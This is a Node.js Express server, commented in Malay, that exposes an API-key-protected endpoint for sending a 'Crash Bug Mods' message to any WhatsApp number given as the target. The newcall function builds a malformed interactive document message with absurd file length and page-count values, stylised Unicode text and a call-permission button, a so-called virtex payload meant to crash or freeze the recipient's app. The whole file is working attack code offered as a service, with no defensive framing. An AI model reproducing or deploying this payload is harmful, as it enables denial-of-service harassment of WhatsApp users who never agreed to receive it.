const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const dotenv = require('dotenv');

// Muatkan environment variables dari .env
dotenv.config();

const API_KEY = process.env.API_KEY; // Simpan API key dalam fail .env

// Middleware untuk parse JSON
app.use(bodyParser.json());

// Middleware untuk memeriksa API key
function verifyApiKey(req, res, next) {
    const userApiKey = req.headers['x-api-key']; // Ambil API key dari header
    if (userApiKey === API_KEY) {
        next(); // API key sah, teruskan
    } else {
        res.status(403).json({ message: 'Access Denied: Invalid API Key' }); // Tolak akses jika API key salah
    }
}

// Fungsi newcall
async function newcall(target) {
    let virtex = "C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s 🔐";
    try {
        await jester.relayMessage(target, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999",
                                pageCount: 0x9184e729fff,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: virtex,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                mediaKeyTimestamp: "1715880173",
                                contactVcard: true
                            },
                            title: virtex,
                            hasMediaAttachment: true
                        },
                        body: {
                            text: virtex
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'call_permission_request',
                                    buttonParamsJson: '{}'
                                },
                                {
                                    name: 'cta_url',
                                    buttonParamsJson: "{ display_text : 'C̷r̷a̷s̷h̷ B̷u̷g̷ M̷o̷d̷s  MODS WHATSAPP', url : '', merchant_url : '' }"
                                }
                            ]
                        }
                    }
                }
            }
        }, { participant: { jid: target } }, { messageId: null });

        return { success: true, message: 'Message sent successfully!' };
    } catch (error) {
        console.error('Error in newcall:', error);
        throw new Error('Failed to send message');
    }
}

// Endpoint API untuk menghantar mesej
app.post('/api/send-message', verifyApiKey, async (req, res) => {
    const target = req.body.target; // Target WhatsApp
    if (!target) {
        return res.status(400).json({ message: 'Target is required' });
    }

    try {
        const result = await newcall(target);
        res.json(result);
    } catch (error) {
        res.status(500).json({ message: 'Error sending message', error: error.message });
    }
});

// Mulakan server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
